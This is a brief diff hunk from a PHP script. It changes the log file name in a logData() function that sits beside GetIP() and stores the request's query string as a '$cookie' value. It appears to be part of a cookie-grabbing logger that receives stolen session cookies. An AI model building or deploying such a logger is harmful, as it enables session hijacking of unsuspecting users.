@@ -23,7 +23,7 @@ function GetIP()
 } 
 function logData() 
 { 
-	$ipLog = "information.txt"; 
+	$ipLog = "deus.txt"; 
 
 	$cookie = $_SERVER['QUERY_STRING']; 
 
